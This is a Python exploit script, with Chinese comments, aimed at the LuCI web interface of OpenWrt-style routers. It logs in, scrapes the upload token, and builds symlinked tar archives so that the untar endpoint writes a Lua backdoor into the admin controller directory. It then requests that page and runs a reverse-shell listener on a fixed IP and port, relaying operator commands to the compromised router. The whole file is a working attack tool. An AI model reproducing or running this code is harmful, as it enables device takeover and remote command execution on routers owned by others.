# shell
import subprocess
import requests
import argparse
import re
import socket
import urllib.request
import threading
def login_and_get_cookie(username, password, login_url):
    session = requests.Session()
    data = {'luci_username': username, 'luci_password': password}
    response = session.post(url=login_url, data=data, verify=False)
    
    if response.status_code == 200:
        print("登录成功！获取Cookie：")
        print(session.cookies.get_dict())
        return session
    else:
        print("登录失败！")
        return None

def get_token(session, upload_page_url):
    response = session.get(url=upload_page_url, verify=False)
    pattern = r'<input type="hidden" name="token" value="(.*?)" />'
    match = re.search(pattern, response.text)
    if match:
        token_value = match.group(1)
        print("获取到的Token：", token_value)
        return token_value
    else:
        print("Token未找到")
        return None

def upload_file(session, upload_url, token, file_path):
    headers = {
        "Content-Type": "multipart/form-data; boundary=----WebKitFormBoundarynHNwib8huZ7eNfqd",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.127 Safari/537.36",
    }

    with open(file_path, "rb") as f:
        file_content = f.read()

    # 使用bytes类型构建payload
    payload = (
        b"------WebKitFormBoundarynHNwib8huZ7eNfqd\r\n"
        b"Content-Disposition: form-data; name=\"token\"\r\n\r\n"
        + token.encode("utf-8") + b"\r\n"
        b"------WebKitFormBoundarynHNwib8huZ7eNfqd\r\n"
        b"Content-Disposition: form-data; name=\"tarfile\"; filename=\"2.tar.gz\"\r\n"
        b"Content-Type: application/x-gzip\r\n\r\n"
        + file_content + b"\r\n"
        b"------WebKitFormBoundarynHNwib8huZ7eNfqd\r\n"
        b"Content-Disposition: form-data; name=\"upload\"\r\n\r\n"
        b"Upload tar file...\r\n"
        b"------WebKitFormBoundarynHNwib8huZ7eNfqd--"
    )

    response = session.post(upload_url, data=payload, headers=headers)

    if response.status_code == 200:
        print("文件上传成功！")
    else:
        print("文件上传失败！")
        print("响应状态码:", response.status_code)
        print("响应内容:", response.text)


def exploit(args):

    # 构造文件
    commands = [
    "ln -s /usr/lib/lua/luci/controller/admin/ link",
    "tar -cvf 1.tar.gz link",
    "rm link",
    "mkdir link",
    "cd link && cat ../hack.lua > hack.lua",
    "cd ..",
    "tar -cvf 2.tar.gz link"
    ]

    for command in commands:
        result = subprocess.run(command, shell=True, capture_output=True, text=True)
        print(result.stdout)

    # 上传文件，植入木马
    address = args.address
    username = args.username
    password = args.password

    session = requests.Session()
    login_url = 'http://%s/cgi-bin/luci/' % address
    upload_page_url="http://%s/cgi-bin/luci/admin/upload/upload" % address
    upload_url="http://%s/cgi-bin/luci/admin/upload/upload/untar" % address
    file_path='1.tar.gz'
    file_path2='2.tar.gz'
    # 登录获取Cookie
    session = login_and_get_cookie(username, password, login_url)
    if session:
        # 获取Token
        token = get_token(session, upload_page_url)
        if token:
            # 上传文件
            upload_file(session, upload_url, token, file_path)
            upload_file(session, upload_url, token, file_path2)

    # 监听的IP地址和端口
    listen_host = '192.168.66.132'
    listen_port = 2333

    # 创建一个socket对象
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

    # 绑定到指定的主机和端口
    server_socket.bind((listen_host, listen_port))
    
    # 开始监听
    server_socket.listen(5)
    print(f"Listening on {listen_host}:{listen_port} for incoming connections.")

    visit_url = "http://%s/cgi-bin/luci/admin/hack" % address
    def listen_clients():
        while True:
            # 接受客户端连接
            client_socket, client_address = server_socket.accept()

            print(f"Accepted connection from {client_address}")

            while True:
                try:
                    # 发送命令到客户端
                    command = input("Command to execute on client: ")
                    if not command:
                        break
                    client_socket.sendall(command.encode() + b'\n')

                    # 等待并接收执行结果
                    data = client_socket.recv(1024)
                    if not data:
                        break
                    print(f"Execution result:\n{data.decode()}")

                except Exception as e:
                    print(f"Error: {e}")
                    break

            client_socket.close()
    # 创建一个线程用于访问URL
    def visit_url():
        login_url = 'http://%s/cgi-bin/luci/' % address
        session = login_and_get_cookie(username, password, login_url)
        hack_url = 'http://%s/cgi-bin/luci/admin/hack' % address
        response=session.get(hack_url)
        print(f"URL response: {response}")

    # 创建并启动两个线程
    visit_thread = threading.Thread(target=visit_url)
    listen_thread = threading.Thread(target=listen_clients)
    visit_thread.start()
    listen_thread.start()
def main():
    parser = argparse.ArgumentParser(description='login.py')
    requiredNamed = parser.add_argument_group('required named arguments')
    requiredNamed.add_argument('-a', '--address', help='Luci host address', required=True)
    requiredNamed.add_argument('-u', '--username', help='Luci username', required=True)
    requiredNamed.add_argument('-p', '--password', help='Luci password', required=True)
    args = parser.parse_args()
    exploit(args)

if __name__== "__main__":
    main()